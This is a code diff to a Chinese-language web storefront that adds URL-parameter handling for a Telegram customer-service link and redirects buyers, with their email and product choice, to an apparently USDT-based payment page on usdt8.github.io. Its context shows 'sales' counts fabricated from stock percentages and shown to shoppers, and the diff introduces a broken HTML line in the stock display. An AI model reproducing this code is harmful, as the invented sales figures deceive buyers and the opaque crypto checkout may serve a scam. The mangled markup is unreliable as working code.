@@ -463,6 +463,23 @@
 				renderProducts(filteredProducts)
 			}
 
+			// 动态处理参数
+			;(function () {
+				const params = new URLSearchParams(window.location.search)
+				const name = params.get('name')
+				const kefu = params.get('kefu') || 'okk13'
+				const tgid = params.get('tgid') || '5866891166'
+
+				if (name) {
+					document.title = name
+					const titleEl = document.querySelector('.nav-title')
+					if (titleEl) titleEl.textContent = name
+				}
+				// 统一处理客服链接
+				const tgLink = document.getElementById('tgLink')
+				if (tgLink) tgLink.href = `https://t.me/${kefu}`
+			})()
+
 			let selectedProductId = null
 
 			// 渲染商品列表
@@ -501,7 +518,7 @@
                         <div class="product-price">价格: ${product.price}</div>
                         <div class="product-sales">销量: ${Math.floor(36914 * (product.stock / 100))}</div>
                         <div class="stock-container">
-                            <div class="stock-text">剩余库存: ${product.stock}%</div>
+                            <div class="stock-text: ${product.stock}%</div>
                             <div class="stock-progress">
                                 <div class="${stockClass}" style="width: ${product.stock}%"></div>
                             </div>
@@ -538,11 +555,16 @@
 
 				// 构建跳转链接
 				const currentParams = new URLSearchParams(window.location.search)
-				currentParams.set('email', email)
-				currentParams.set('id', selectedProductId)
+				const tgid = currentParams.get('tgid') || '5866891166'
+				const kefu = currentParams.get('kefu') || 'okk13'
 
-				const targetUrl = `https://usdt8.github.io/c/index.html?${currentParams.toString()}`
-				window.location.href = targetUrl
+				const payParams = new URLSearchParams(window.location.search)
+				payParams.set('email', email)
+				payParams.set('id', selectedProductId)
+				payParams.set('tgid', tgid)
+				payParams.set('kefu', kefu)
+
+				window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
 			}
 
 			// 获取所有唯一分类
